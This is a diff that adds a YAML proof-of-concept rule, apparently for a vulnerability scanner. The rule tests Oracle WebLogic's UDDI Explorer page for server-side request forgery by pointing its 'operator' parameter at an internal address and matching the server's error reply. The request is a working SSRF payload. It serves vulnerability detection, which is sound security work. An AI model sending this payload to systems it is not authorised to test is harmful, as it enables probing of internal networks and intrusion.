@@ -1,0 +1,11 @@
+name: poc-yaml-weblogic-ssrf
+rules:
+  - method: GET
+    path: >-
+      /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700
+    headers:
+      Cookie: >-
+        publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;
+    follow_redirects: false
+    expression: >-
+      response.status == 200 && (response.body.bcontains(b"&#39;127.1.1.1&#39;, port: &#39;700&#39;") || response.body.bcontains(b"Socket Closed"))
